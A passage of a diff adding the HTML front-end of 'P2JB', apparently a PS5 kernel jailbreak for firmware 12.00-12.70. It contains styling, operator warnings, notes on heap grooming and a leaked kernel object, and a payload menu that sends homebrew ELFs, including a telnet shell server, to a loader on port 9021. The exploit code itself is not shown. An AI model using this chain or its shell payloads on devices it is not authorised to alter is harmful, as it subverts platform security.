@@ -1,0 +1,3269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>P2JB</title>
+<!-- per-page brand (combined site) -->
+<script>window.__BRAND="P2JB";try{document.title="P2JB";}catch(e){}</script>
+
+<script>(function () {
+    var pending = [];
+    window.__jbEarly = pending;
+    function raw(tag, text) {
+        var line = "a0-rboot-s" + (pending.length + 1) + "-note-" + tag
+            + "-" + String(text).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 160);
+        pending.push(line);
+        /* Same hazard as flushMark: this is the EARLY bootstrap reporter, so it runs before
+           the beacon latch exists. On a static host log/ does not exist and a 404 does not
+           throw, so each early error blocked the main thread on a full internet round trip,
+           unlatched. Latch it here too - the on-screen #early log is unaffected and is the
+           readout that actually matters when the page is served remotely. */
+        if (!window.__earlyBeaconOff) {
+            try {
+                var x = new XMLHttpRequest();
+                x.open("GET", "log/" + encodeURIComponent(line), false);
+                x.send();
+                if (x.status && (x.status < 200 || x.status >= 300))
+                    window.__earlyBeaconOff = true;
+            } catch (e) { window.__earlyBeaconOff = true; }
+        }
+        try {
+            var d = document.getElementById("early");
+            if (d) d.textContent += line + "\n";
+        } catch (e) { }
+    }
+    window.__jbRaw = raw;
+    window.alert = function (m) { raw("ALERT-INTERCEPTED", m); };
+    window.confirm = function (m) { raw("CONFIRM-INTERCEPTED", m); return false; };
+    window.addEventListener("error", function (e) {
+        raw("WINDOW-ERROR", (e && e.message) + "@" + (e && e.filename)
+            + ":" + (e && e.lineno));
+    });
+    window.addEventListener("unhandledrejection", function (e) {
+        raw("UNHANDLED-REJECTION",
+            e && e.reason && (e.reason.message || e.reason));
+    });
+})();
+</script>
+
+<style>
+  /* poopsploit chrome (2026-08-25): match the standalone poopsploit run page.
+     Paint only - background, text colour and the hot-nav accents. The body's flex
+     centring is deliberately NOT copied: #payloadMenu is a body child, so centring
+     would reflow the ELF/payload menu, which is meant to stay as it is. */
+  html, body { margin: 0; padding: 0; min-height: 100%;
+    background: radial-gradient(circle at 50% 28%, #18233a 0, #0c111b 44%, #07090e 100%);
+    color: #d8dee9; }
+  body { font: 22px/1.35 "Consolas", "DejaVu Sans Mono", monospace;
+         padding: 16px 20px 80px; }
+  h1 { font-size: 30px; margin: 0 0 2px; color: #eceff4; font-weight: 600; }
+  .sub { font-size: 18px; color: #7c8795; margin: 0 0 12px; }
+  #stage { font-size: 24px; padding: 9px 13px; border-radius: 6px;
+           margin-bottom: 12px; background: #1b2430; border-left: 8px solid #5e81ac; }
+  #stage.ok  { background: #16281c; border-left-color: #47c76a; color: #b8f0c6; }
+  #stage.bad { background: #2c1618; border-left-color: #e05561; color: #ffc9cd; }
+  #danger { display: none; font-size: 24px; font-weight: 700; padding: 14px 16px;
+            margin-bottom: 12px; border-radius: 6px; background: #3a1113;
+            border: 3px solid #e05561; color: #ffd7da; white-space: pre-wrap; }
+  #danger.on { display: block; }
+
+  #reboot { display: none; font-size: 34px; font-weight: 800; padding: 20px 18px;
+            margin-bottom: 14px; border-radius: 8px; background: #4a0d10;
+            border: 5px solid #ff5566; color: #ffe3e6; white-space: pre-wrap;
+            line-height: 1.25; }
+  #reboot.on { display: block; }
+  #reboot.fine { background: #0f2c17; border-color: #47c76a; color: #c9f6d6; }
+
+  /* OPERATOR NOTICES - static text, shown from page load, never touched by JS.
+     Deliberately TEXT ONLY: FAILS F40 was an <img> plus a CSS rule added to the
+     PAYLOAD MENU, which perturbed the heap groom and took the jailbreak 8/8 -> 0/3.
+     These sit at the top of the document beside #reboot/#danger, which are the same
+     shape, carry no images, no fonts and no new network fetches, and are NOT in the
+     body.quiet hide-list so they stay visible in the operator view. */
+  #okinfo  { font-size: 20px; font-weight: 700; padding: 12px 16px;
+             margin-bottom: 10px; border-radius: 6px; background: #10233a;
+             border: 3px solid #4d8fd6; color: #d6e8ff; white-space: pre-wrap; }
+  #nopower { font-size: 20px; font-weight: 700; padding: 12px 16px;
+             margin-bottom: 12px; border-radius: 6px; background: #3a3110;
+             border: 3px solid #e0c355; color: #ffefc2; white-space: pre-wrap; }
+
+  #verdict { display: none; font-size: 26px; font-weight: 700; padding: 16px 18px;
+             margin-bottom: 14px; border-radius: 8px; background: #101a26;
+             border: 4px solid #6d7788; color: #dfe7f0; white-space: pre-wrap;
+             line-height: 1.3; }
+  #verdict.on   { display: block; }
+  #verdict.good { background: #0f2c17; border-color: #47c76a; color: #d4f7de; }
+  #verdict.bad  { background: #4a0d10; border-color: #ff5566; color: #ffe3e6; }
+  #verdict.warn { background: #2e2413; border-color: #ebcb8b; color: #f6e6bd; }
+  #vitals { display: none; font-size: 24px; padding: 10px 14px; margin-bottom: 12px;
+            border-radius: 6px; background: #17212e; border-left: 8px solid #ebcb8b;
+            color: #e8dcb6; white-space: pre-wrap; }
+  #vitals.on { display: block; }
+  #cfg { font-size: 22px; color: #9fb1c3; background: #131922; padding: 10px 13px;
+         border-radius: 6px; margin-bottom: 12px; white-space: pre-wrap; }
+  #scr, #early { font-size: 15px; color: #6d7788; margin: 0 0 10px;
+                 white-space: pre; overflow: hidden; min-height: 1.3em; }
+  #nav { margin: 0 0 14px; }
+  #nav a { display: inline-block; margin: 0 12px 8px 0; padding: 10px 18px;
+           background: #1b2430; border: 2px solid #3b4756; border-radius: 6px;
+           color: #d8dee9; text-decoration: none; font-size: 20px; }
+  #nav a.primary { border-color: #5e81ac; background: #223146; color: #cfe3ff; }
+  #nav a.hot { border-color: #52647c; background: #202d40; color: #dce8f7; }
+
+  #nav a.one { display: block; font-size: 30px; font-weight: 700;
+               padding: 20px 26px; margin: 0 0 12px;
+               border-color: #5e81ac; background: #223146; color: #cfe3ff; }
+  #nav a.one.hot { border-color: #52647c; background: #202d40; color: #dce8f7; }
+
+  body.quiet #nav a.extra { display: none; }
+  #nav a:focus { outline: 3px solid #ebcb8b; }
+  #arm { font-size: 26px; padding: 24px 6px; color: #ebcb8b; }
+  #wrap { overflow-x: auto; }
+  table { border-collapse: collapse; width: 100%; min-width: 640px; }
+  thead th { position: sticky; top: 0; background: #131922; color: #8fa1b3;
+             text-align: left; font-size: 17px; padding: 8px 10px;
+             border-bottom: 2px solid #2a3340; z-index: 2; }
+  td { padding: 9px 10px; vertical-align: top; border-bottom: 1px solid #1d232c; }
+  td.n  { width: 2.6em; color: #55606e; font-size: 17px; }
+  td.k  { width: 12em; color: #cfd8e3; font-weight: 700; }
+  td.k .cls { display: block; color: #61708a; font-weight: 400; font-size: 15px; }
+  td.st { width: 4.6em; font-weight: 700; font-size: 25px; }
+  td.st.PASS { color: #47c76a; }
+  td.st.FAIL { color: #e05561; }
+  td.st.SKIP { color: #8f7a3f; }
+  td.st.RUN  { color: #ebcb8b; }
+  td.d { color: #aeb8c6; font-size: 19px; word-break: break-word;
+         white-space: pre-wrap; }
+  td.d .why  { color: #e0a3a8; }
+  td.d .note { color: #7fb7d4; display: block; font-size: 17px; }
+  td.d .pu   { color: #6b7a8c; display: block; font-size: 15px; margin-top: 3px; }
+  td.d .ev   { color: #5a6472; display: block; font-size: 15px; margin-top: 3px; }
+  #tally { margin-top: 18px; font-size: 30px; font-weight: 700; }
+  #summary { margin-top: 10px; font-size: 20px; color: #9fb1c3;
+             white-space: pre-wrap; }
+
+  #dt { position: fixed; top: 10px; right: 12px; z-index: 9;
+        font: 700 18px ui-monospace, Menlo, Consolas, monospace;
+        padding: 10px 16px; border-radius: 6px; cursor: pointer;
+        background: #1b2430; border: 2px solid #3b4756; color: #9fb1c3; }
+  #dt:focus { outline: 3px solid #ebcb8b; }
+  body.quiet #dt { color: #61708a; }
+
+  body.quiet h1,
+  body.quiet .sub,
+  body.quiet #cfg,
+  body.quiet #summary,
+  body.quiet #tally,
+  body.quiet #wrap,
+  body.quiet #early,
+  body.quiet #vitals,
+  body.quiet #verdict,
+  body.quiet #danger,
+  body.quiet #stage,
+  body.quiet td.d .pu,
+  body.quiet td.d .ev                     { display: none; }
+
+  body.quiet #reboot { font-size: 26px; }
+
+  /* The scrolling log is hidden on the waiting screen: #livestat already carries the
+     phase, both clocks, the progress meter and the ETA, and the raw beacon tail below it
+     was just noise. Everything still goes to the host log. Non-quiet mode keeps it. */
+  body.quiet #scr { display: none; }
+
+  body.quiet tr:not(.r-FAIL) td.d .note   { display: none; }
+
+  body.quiet tr:not(.r-FAIL) td.d > span:first-child {
+        display: -webkit-box; display: box; overflow: hidden;
+        -webkit-line-clamp: 1; -webkit-box-orient: vertical; }
+
+  body.quiet #stage { font-size: 34px; }
+
+  /* same treatment slopkit2 gives its image: rounded, ringed, soft halo */
+  #cat { display:block; margin:0 auto 26px; width:240px; max-width:66vw;
+         border:0; border-radius:10px;
+         box-shadow:0 0 0 2px #2a2a2e, 0 0 20px 4px #2a2a2e; }
+  #cat.ok  { box-shadow:0 0 0 2px #16c60c, 0 0 20px 4px #0e5c08; }
+  #cat.bad { box-shadow:0 0 0 2px #e74856, 0 0 20px 4px #5c1116; }
+
+  /* ------------------------------------------------------------------ waiting screen
+     Laid out like slopkit2: one centred column on the #0c0c0f ground, the gif on top
+     with its ring and halo, then the progress card, then a compact log tail. Only CSS
+     values change here - no elements are added, removed or reordered, because the
+     exploit's groom is sensitive to when the image loads and to the page it grooms
+     against. Monospace is kept for #livestat: the progress meter is column-aligned. */
+  body.quiet {
+        display: flex; flex-direction: column;
+        align-items: center; justify-content: center;
+        min-height: 100vh; margin: 0; padding: 20px 16px; box-sizing: border-box;
+        overflow-y: auto; font-family: Arial; }
+
+  #livestat {
+        font: 700 18px/1.5 "Consolas", "DejaVu Sans Mono", monospace;
+        color: #d8d8dc; background: #17171b;
+        border: 1px solid #2a2a2e; border-radius: 14px;
+        padding: 16px 20px; margin: 0 0 16px;
+        white-space: pre-wrap; width: 100%; max-width: 900px;
+        box-sizing: border-box; }
+
+  body.quiet #nav { margin: 16px 0 0; text-align: center; }
+  body.quiet #nav a {
+        border: none; background-color: #202125; color: #fff;
+        border-radius: 1.25rem; padding: 0.8rem 1.6rem; min-width: 10rem;
+        font: 800 1.1rem Arial; text-align: center;
+        transition: background-color 0.25s ease; }
+  body.quiet #nav a:hover,
+  body.quiet #nav a:focus { background-color: #a2a2a6; color: #202020; outline: none; }
+  body.quiet #nav a.one { font-size: 1.5rem; padding: 1rem 2rem; min-width: 12rem; }
+  /* .hot deliberately keeps its red: the only place it still renders is the pre-run ARM
+     gate ("this console will need A REBOOT"), where the warning colour is the point. It
+     no longer appears during a run - renderNav() skips START when the page is ARMED. */
+
+  #wrap { display:none !important; }
+  /* PAYLOAD MENU - taken from the zecoxao reference (slopkit2/poops.html), not invented.
+     The dynamically-built full-screen overlay this replaces was SIGTRAP-ing the WebProcess
+     (App Crash PID=0x55 reason=0x5, beacons stopping dead at WIN-OVERLAY) and its text
+     measured zero-width on this WebKit (WIN-GEOM: t1=0x27). The reference sidesteps both:
+     the menu is STATIC markup toggled with a class, and every label is an IMAGE, not text.
+     Images demonstrably render here - the success gif always did. */
+  #payloadMenu { display:none; width:1356px; max-width:94vw; margin:4px auto 24px; }
+  #payloadMenu.on { display:block; }
+  #payloadMenu .menuTitle { display:block; width:330px; height:56px;
+    max-width:100%; margin:0 auto 12px; }
+  #payloadMenu .payloadGrid { display:flex; flex-wrap:wrap;
+    justify-content:center; }
+  #payloadMenu .payloadTile {
+    box-sizing:border-box; display:block; flex:0 0 calc(25% - 12px);
+    width:330px; min-width:0; max-width:330px; margin:6px; padding:0;
+    border:0; border-radius:13px;
+    background:transparent; text-decoration:none !important;
+  }
+  #payloadMenu .payloadTile:focus { outline:3px solid #fff; outline-offset:2px; }
+  #payloadMenu .payloadTile img { display:block; width:330px; height:72px;
+    max-width:100%; margin:0 auto; }
+  #payloadMenu .payloadTile.busy { opacity:.42; }
+  /* Result state is colour only - never text inside this overlay. */
+  #payloadMenu .payloadTile.sent   { outline:3px solid #47c76a; outline-offset:2px; }
+  #payloadMenu .payloadTile.failed { outline:3px solid #e05561; outline-offset:2px; }
+  /* ---- PAYLOAD GRID: poopsploit's layout, PNG labels ---------------------------
+     poopsploit's #payloads-view shape - a header over a two-column grid of rounded
+     tiles - but every label is an IMAGE. Text was tried on 2026-08-26 and laid out
+     perfectly while painting no glyphs at all ("the boxes are there but invisible"),
+     on 12.00 retail and 12.70 devkit both. Images are what this browser renders, which
+     is why the page has used them from the start. */
+  /* poopsploit's ELF page is flat near-black behind grey buttons. p2jb's page is a
+     blue radial gradient (#18233a -> #0c111b -> #07090e), so the same #202125 tiles
+     read completely differently on it. Paint the page poopsploit-black while the grid
+     is open, and put it back when it is not - the class is only ever on for the menu. */
+  body.payload-grid-active { background:#0c0c0f !important; color:#fff; }
+  #payloadMenuGrid { display:none; width:1356px; max-width:96vw; margin:0 auto 24px;
+    box-sizing:border-box; }
+  #payloadMenuGrid.on { display:block; }
+  #payloadMenuGrid .payloadHeader { box-sizing:border-box; padding:.5rem;
+    text-align:center; }
+  #payloadMenuGrid .menuTitle { display:block; width:626px; height:56px;
+    max-width:100%; margin:0 auto 12px; }
+  #payloadMenuGrid .payloadGrid { display:grid;
+    grid-template-columns:repeat(2,minmax(0,1fr));
+    column-gap:2.5rem; row-gap:1rem; width:100%; padding:0 2rem 2rem 2rem;
+    box-sizing:border-box; align-content:start; }
+  /* The PNG *is* the button - poopsploit grey rounded rect with its title,
+     description and attribution baked in by tools/make_payload_buttons.py.
+     The tile is a transparent hit target or it draws a box behind the box. */
+  #payloadMenuGrid .payloadTile {
+    box-sizing:border-box; display:block; width:100%; margin:0; padding:0; border:0;
+    background:transparent; text-decoration:none !important; cursor:pointer;
+    border-radius:1.25rem; }
+  #payloadMenuGrid .payloadTile:hover,
+  #payloadMenuGrid .payloadTile:focus { outline:3px solid #fff; outline-offset:2px;
+    background:#2b2c31; }
+  #payloadMenuGrid .payloadTile img { display:block; width:626px;
+    height:104px; max-width:100%; margin:0 auto; }
+  #payloadMenuGrid .payloadTile.busy { opacity:.42; }
+  /* Result is colour only - there is no text anywhere in here to change. */
+  #payloadMenuGrid .payloadTile.sent   { outline:3px solid #47c76a; outline-offset:2px; }
+  #payloadMenuGrid .payloadTile.failed { outline:3px solid #e05561; outline-offset:2px; }
+
+</style>
+</head>
+<body class="quiet">
+<img id="cat" alt="">
+<!-- Win/fail gifs preloaded at PAGE LOAD (before any exploit code), decoded into
+     the renderer heap so showWin/showFail re-parent a live node instead of
+     fetching post-jailbreak. Kept OUT of the exploit window on purpose. -->
+<img data-gif="2.gif" src="2.gif" alt="" style="position:absolute;left:-9999px;top:0;width:1px;height:1px;opacity:0;">
+<img data-gif="3.gif" src="3.gif" alt="" style="position:absolute;left:-9999px;top:0;width:1px;height:1px;opacity:0;">
+<h1>P2JB</h1>
+<div id="reboot"></div>
+<div id="okinfo">A 'system software error' at the END of the run is NORMAL - it is the
+console tearing down a socket this exploit deliberately left pointing at a live kernel
+object. Press OK. The payload / ELF page loads straight after you dismiss it.</div>
+<div id="nopower">DO NOT TURN THE CONSOLE OFF during the ~55 minute leak, or during the
+DRAINING and TOP-UP stage that follows it. The screen looks idle for a long time on
+purpose - that is normal. Wait until the payload menu appears.</div>
+<div id="verdict"></div>
+<div id="danger"></div>
+<div id="stage">idle</div>
+<div id="vitals"></div>
+<div id="cfg"></div>
+<pre id="early"></pre>
+<pre id="scr"></pre>
+<!-- PAYLOAD GRID, poopsploit layout with PNG labels. Built by the inline script below at
+     PAGE LOAD - before rop.js, before main.js, before any exploit code. The overlay that
+     crashed this page was built AFTER the win instead, from inside the jailbroken
+     renderer. Artwork is referenced with data-src and only fetched when the menu opens,
+     so tile images never load during the heap groom. The legacy flat menu underneath
+     stays as a fallback. -->
+<!-- ===== poopsploit payload view, ported verbatim (see tools/port_poopsploit_view.py) - only reachable with ?textmenu=1 ===== -->
+<style>
+  #payloads-view {
+    display:grid !important; grid-template-rows:auto 1fr;
+    overflow:hidden; background:#0c0c0f; color:#fff;
+  }
+  #prompt-view {
+    display:flex; align-items:center; justify-content:center;
+    overflow:hidden; background:#0c0c0f; color:#fff;
+  }
+  .payloadHeader {
+    position:relative; box-sizing:border-box; min-height:112px;
+    padding:.5rem; text-align:center;
+  }
+  .payloadHeader h2 {
+    margin:.35rem 0; color:#fff; font-size:2rem; line-height:1.2;
+  }
+  .payloadEyebrow { color:#ccc; font-size:1rem; }
+  .payloadHeader p { margin:0; color:#ccc; font-size:.9rem; }
+  .homeLink {
+    position:absolute; top:.75rem; right:1rem; padding:.5rem 1rem;
+    border-radius:1rem; color:#fff; background:#202125;
+    text-decoration:none; font-size:1rem;
+  }
+  .homeLink:hover, .homeLink:focus {
+    outline:0; background:#a2a2a6; color:#202020;
+  }
+
+  #payloads-view .payloadGrid {
+    display:grid !important;
+    grid-template-columns:repeat(2,minmax(0,1fr));
+    grid-auto-rows:auto;
+    column-gap:2.5rem;
+    row-gap:1rem;
+    width:100%;
+    height:auto; min-height:0;
+    padding:0 2rem 2rem 2rem;
+    overflow-y:scroll;
+    overflow-x:hidden;
+    box-sizing:border-box;
+    align-content:start;
+  }
+  #payloads-view .btn {
+    display:inline-block;
+    box-sizing:border-box;
+    width:100%;
+    min-width:5rem;
+    margin:.2rem;
+    padding:1rem 2rem;
+    border:0;
+    border-radius:1.25rem;
+    background:#202125;
+    color:#fff;
+    cursor:pointer;
+    line-height:2.5rem;
+    text-align:center;
+    text-decoration:none;
+    font-size:1.3rem;
+  }
+  #payloads-view .btn:hover, #payloads-view .btn:focus {
+    outline:0;
+    background:#a2a2a6;
+    color:#202020;
+  }
+  .payload-btn-title {
+    display:block !important;
+    visibility:visible !important;
+    opacity:1 !important;
+    margin:0;
+    padding:0;
+    color:#fff !important;
+    -webkit-text-fill-color:#fff;
+    line-height:2.5rem;
+    font-size:1.3rem;
+    font-weight:bolder;
+  }
+  .payload-btn-description {
+    display:block !important;
+    visibility:visible !important;
+    opacity:1 !important;
+    max-width:100%;
+    margin:0;
+    padding:0;
+    overflow:hidden;
+    color:#ccc;
+    -webkit-text-fill-color:#ccc;
+    text-overflow:ellipsis;
+    white-space:nowrap;
+    line-height:2rem;
+    font-size:1rem;
+  }
+  .btn:hover .payload-btn-description,
+  .btn:focus .payload-btn-description {
+    color:#444 !important; -webkit-text-fill-color:#444;
+  }
+  .payload-btn-info {
+    display:block !important;
+    visibility:visible !important;
+    opacity:1 !important;
+    margin:0;
+    padding:0;
+    overflow:hidden;
+    color:#999;
+    -webkit-text-fill-color:#999;
+    text-overflow:ellipsis;
+    line-height:1.5rem;
+    font-size:.9rem;
+    font-weight:normal;
+  }
+  .btn:hover .payload-btn-info,
+  .btn:focus .payload-btn-info {
+    color:#555 !important; -webkit-text-fill-color:#555;
+  }
+  #payloads-view .btn:hover .payload-btn-title,
+  #payloads-view .btn:focus .payload-btn-title {
+    color:#202020 !important; -webkit-text-fill-color:#202020;
+  }
+  #payloads-view .btn.busy { opacity:.45; pointer-events:none; }
+
+  #loaderPrompt {
+    display:block; width:70%; max-width:760px; margin:0; padding:2rem;
+    box-sizing:border-box;
+    text-align:center; color:#fff;
+  }
+  .promptBadge { display:none; }
+  #loaderPrompt h2 { margin:0; color:#fff; font-size:2rem; }
+  #loaderPrompt p { margin:10px auto 24px; max-width:470px; color:#ccc; font-size:1rem; }
+  .promptActions { display:block; text-align:center; }
+  .promptButton {
+    display:inline-block; box-sizing:border-box; width:50%; min-width:5rem;
+    margin:.2rem; padding:1rem 2rem; border:0; border-radius:1.25rem;
+    background:#202125; color:#fff; line-height:2.5rem;
+    text-decoration:none; font-size:1.3rem; font-weight:800;
+  }
+  .promptButton.secondary { padding:.5rem 2rem; font-size:1rem; }
+  .promptButton:hover, .promptButton:focus {
+    outline:0; background:#a2a2a6; color:#202020;
+  }
+  /* Hidden until asked for. poopsploit's own rule is `display:grid !important` because
+     its view switcher owns visibility; here the page toggles .on instead. */
+  #payloads-view:not(.on) { display:none !important; }
+  /* (the .on display rule lives with the safe-shape block below - grid was the
+     poopsploit scaffolding shape and does not apply here) */
+  /* THE THING THAT WAS ACTUALLY WRONG.
+     poopsploit's #payloads-view is `grid-template-rows: auto 1fr` and gets its height
+     from #main-content (height:100%) inside a 100vh body grid. Dropped into p2jb as a
+     plain body child it inherits NO height: the header row draws, the 1fr tile row
+     collapses to nothing, and .payloadGrid's `overflow-y:scroll` clips the tiles out of
+     existence - boxes present, contents invisible. Give the view its own height as a
+     full-screen overlay and every inner rule below works exactly as it does over there,
+     with no dependency on p2jb's body layout. */
+  /* SAFE SHAPE, 2026-08-27. The previous version showed this view by promoting a
+     hidden element to a position:fixed full-screen z-index:99999 layer AFTER the
+     jailbreak, and that killed the renderer on 12.00 retail - beacons stopped dead at
+     WIN-OVERLAY, the documented App Crash PID=0x55 reason=0x5 signature. Post-JB the
+     safe move is a PAINT change on an element that is already laid out, not a new
+     compositing layer: both menus that have ever worked here are plain in-flow blocks
+     toggled display:none -> block, and neither positions nor layers anything.
+     So this view is now the same shape. That also removes the height problem it had as
+     a plain body child: with display:block there is no `auto 1fr` row to collapse, and
+     the grid's own scroller is disabled so its height comes from its content. */
+  #payloads-view.on {
+    display:block !important; position:static; z-index:auto;
+    width:100%; max-width:1356px; height:auto; margin:0 auto 24px;
+    overflow:visible;
+    /* THE FONT, and this is the one concrete difference between the two pages.
+       poopsploit's tiles inherit `body.quiet { font-family:Arial,sans-serif }` - with the
+       generic fallback. p2jb's body.quiet declares bare `font-family: Arial` and the
+       ported rules never set a family of their own, so here the tiles asked for a family
+       the console may not have, with nothing to fall back to. This page's own notes blame
+       exactly that for zero-advance glyphs: "the PS5 browser lacks the families it asked
+       for". State it explicitly so the view inherits what it does over there. */
+    font-family:Arial, Helvetica, sans-serif; }
+  #payloads-view.on .btn,
+  #payloads-view.on .payload-btn-title,
+  #payloads-view.on .payload-btn-description,
+  #payloads-view.on .payload-btn-info,
+  #payloads-view.on .payloadHeader,
+  #payloads-view.on .payloadHeader h2 { font-family:Arial, Helvetica, sans-serif; }
+  #payloads-view.on .payloadGrid {
+    overflow:visible !important; overflow-y:visible !important; height:auto !important;
+    min-height:0; }
+
+</style>
+  <div id="payloads-view" class="app-view">
+    <div class="payloadHeader">
+      <h2 id="payloadViewTitle">P2JB Payloads (12.00-12.70)</h2>
+      <div class="payloadEyebrow" id="payloadNetworkStatus">Listening on console port 9021</div>
+      <p id="payloadProgress">Select a payload to send it to the ELF loader.</p>
+      <a class="homeLink" href="index.html">Home</a>
+    </div>
+    <div class="payloadGrid"></div>
+  </div>
+<script>
+/* SITE IDENTITY - the ONE place this site names itself.
+   The ELF page used to carry another project's name and firmware range because the view
+   was ported verbatim; filling the header from these two constants means a copied file
+   can never silently advertise the wrong thing again. build_p2jb_idle.py rewrites
+   SITE_NAME when it regenerates the idle pair. Nothing here depends on the host, so it
+   is correct served from a LAN box or from a static site. */
+var SITE_NAME = "P2JB";
+var SITE_FW   = "12.00-12.70";
+(function () {
+    try {
+        var h = document.getElementById("payloadViewTitle");
+        if (h) h.textContent = SITE_NAME + " Payloads (" + SITE_FW + ")";
+    } catch (e) { }
+    try { document.title = SITE_NAME; } catch (e) { }
+})();
+</script>
+<script>
+var POOPS_VIEW_PAYLOADS = [
+    { title: "etaHEN", description: "Homebrew enabler and payload host.", name: "etaHEN.elf", key: "etahen", info: "etaHEN.elf" },
+    { title: "ps5-kstuff", description: "Kernel support payload and FPKG enabler.", name: "kstuff.elf", key: "kstuff", info: "kstuff.elf - EchoStretch" },
+    { title: "ShadowMountPlus", description: "Mount and manage game images.", name: "shadowmountplus.elf", key: "shadowmountplus", info: "shadowmountplus.elf - Drakmor" },
+    { title: "Autoloader", description: "Runs a stored payload automatically.", name: "autoloader.elf", key: "autoloader", info: "autoloader.elf" },
+    { title: "ftpsrv", description: "FTP server. Runs on port 2121.", name: "ftpsrv-ps5.elf", key: "ftp", info: "ftpsrv-ps5.elf - john-tornblom" },
+    { title: "Payload Manager", description: "Payload management tools.", name: "pldmgr.elf", key: "plk", info: "pldmgr.elf" },
+    { title: "gdbsrv", description: "GDB server. Runs on port 2159.", name: "gdbsrv-ps5.elf", key: "gdb", info: "gdbsrv-ps5.elf - john-tornblom" },
+    { title: "klogsrv", description: "Kernel log server. Runs on port 3232.", name: "klogsrv-ps5.elf", key: "klog", info: "klogsrv-ps5.elf - john-tornblom" },
+    { title: "shsrv", description: "Telnet shell server. Runs on port 2323.", name: "shsrv-ps5.elf", key: "shell", info: "shsrv-ps5.elf - john-tornblom" },
+    { title: "websrv", description: "Homebrew web server. Runs on port 8080.", name: "websrv-ps5.elf", key: "web", info: "websrv-ps5.elf - john-tornblom" }
+];
+(function () {
+  const PAYLOADS = POOPS_VIEW_PAYLOADS;
+  function populatePayloadButtons() {
+      const host = document.getElementById("payloads-view");
+      if (!host) return;
+      const grid = host.getElementsByClassName("payloadGrid")[0];
+      if (!grid || grid.getElementsByClassName("payloadTile").length) return;
+  
+      for (let i = 0; i < PAYLOADS.length; ++i) {
+          const payload = PAYLOADS[i];
+          const button = document.createElement("a");
+          button.classList.add("payloadTile");
+          button.classList.add("btn");
+          button.tabIndex = 0;
+          button.setAttribute("data-name", payload.name);
+          button.setAttribute("data-key", payload.key);
+  
+          const title = document.createElement("p");
+          title.classList.add("payloadName");
+          title.classList.add("payload-btn-title");
+          title.textContent = payload.title;
+  
+          const description = document.createElement("p");
+          description.classList.add("payload-btn-description");
+          description.textContent = payload.description;
+  
+          const info = document.createElement("p");
+          info.classList.add("payloadStatus");
+          info.classList.add("payload-btn-info");
+          info.setAttribute("data-ready", payload.info);
+          info.textContent = payload.info.replace(" - ", " · ");
+  
+          button.appendChild(title);
+          button.appendChild(description);
+          button.appendChild(info);
+          grid.appendChild(button);
+      }
+  }
+  try { populatePayloadButtons(); } catch (e) { }
+})();
+</script>
+
+<script>
+/* GLYPH PROBE - runs at PARSE TIME, before rop.js, before any exploit code.
+   Why a Range and not a rect: a block box can measure its full width while painting
+   nothing. Zero-advance glyphs produce a correct-looking layout box and no ink, which is
+   the failure this page hit twice and which every box measurement I wrote sailed past.
+   A Range over the TEXT NODE measures glyph ADVANCE, so it tells "text is there" from
+   "text is invisible" - the one thing a getBoundingClientRect on the element cannot.
+   Why here: post-jailbreak the page must not be laying things out or promoting new
+   compositing layers - that killed the renderer on 12.00 at WIN-OVERLAY. At load it is
+   ordinary DOM work with no exploit state to disturb. Measured off-screen and hidden,
+   then put straight back, so nothing is visible either way. Fails closed: any throw and
+   __p2jbTextPaints stays false, which selects the PNG grid. */
+(function probeGlyphAdvance() {
+    var v = document.getElementById("payloads-view");
+    window.__p2jbGlyphAdvance = -1;
+    window.__p2jbTextPaints = false;
+    if (!v) return;
+    var t = v.getElementsByClassName("payload-btn-title")[0];
+    if (!t || !t.firstChild) return;
+    var cls = v.className, sty = v.getAttribute("style") || "";
+    var adv = 0, chars = (t.textContent || "").length;
+    try {
+        v.className = cls + " on";
+        v.setAttribute("style", sty
+            + ";position:absolute;left:-10000px;top:0;visibility:hidden;display:block");
+        var r = document.createRange();
+        r.selectNodeContents(t);
+        var b = r.getBoundingClientRect();
+        adv = b ? Math.round(b.width) : 0;
+    } catch (e) {
+        adv = 0;
+    }
+    try { v.className = cls; v.setAttribute("style", sty); } catch (e) { }
+    window.__p2jbGlyphAdvance = adv;
+    window.__p2jbGlyphChars = chars;
+    // 3px per character is far below any real font at this size and far above zero,
+    // so it separates the two states without pretending to be a precise metric.
+    window.__p2jbTextPaints = (chars > 0 && adv >= chars * 3);
+})();
+</script>
+
+<div id="payloadMenuGrid">
+  <div class="payloadHeader">
+    <img class="menuTitle" data-src="ui/hdr-payloads.png" alt="">
+  </div>
+  <div class="payloadGrid"></div>
+</div>
+
+<script>
+/* Payload tiles are built HERE, at parse time, and never again. Two properties matter:
+   the DOM exists before the exploit runs (poopsploit does the same and has never
+   reproduced p2jb's WIN-OVERLAY renderer crash), and this is a plain classic script -
+   the module scripts below are deferred, so nothing in the exploit chain can have
+   started yet. Click handlers are attached later, by showPayloadMenu(), because
+   sendPayload() lives in module scope. */
+var P2JB_IDLE_PAYLOADS = [
+    { title: "etaHEN", description: "Homebrew enabler and payload host.", name: "etaHEN.elf", key: "etahen", info: "etaHEN.elf" },
+    { title: "ps5-kstuff", description: "Kernel support payload and FPKG enabler.", name: "kstuff.elf", key: "kstuff", info: "kstuff.elf - EchoStretch" },
+    { title: "ShadowMountPlus", description: "Mount and manage game images.", name: "shadowmountplus.elf", key: "shadowmountplus", info: "shadowmountplus.elf - Drakmor" },
+    { title: "Autoloader", description: "Runs a stored payload automatically.", name: "autoloader.elf", key: "autoloader", info: "autoloader.elf" },
+    { title: "ftpsrv", description: "FTP server. Runs on port 2121.", name: "ftpsrv-ps5.elf", key: "ftp", info: "ftpsrv-ps5.elf - john-tornblom" },
+    { title: "Payload Manager", description: "Payload management tools.", name: "pldmgr.elf", key: "plk", info: "pldmgr.elf" },
+    { title: "gdbsrv", description: "GDB server. Runs on port 2159.", name: "gdbsrv-ps5.elf", key: "gdb", info: "gdbsrv-ps5.elf - john-tornblom" },
+    { title: "klogsrv", description: "Kernel log server. Runs on port 3232.", name: "klogsrv-ps5.elf", key: "klog", info: "klogsrv-ps5.elf - john-tornblom" },
+    { title: "shsrv", description: "Telnet shell server. Runs on port 2323.", name: "shsrv-ps5.elf", key: "shell", info: "shsrv-ps5.elf - john-tornblom" },
+    { title: "websrv", description: "Homebrew web server. Runs on port 8080.", name: "websrv-ps5.elf", key: "web", info: "websrv-ps5.elf - john-tornblom" }
+];
+(function buildPayloadTiles() {
+    var host = document.getElementById("payloadMenuGrid");
+    if (!host) return;
+    var grid = host.getElementsByClassName("payloadGrid")[0];
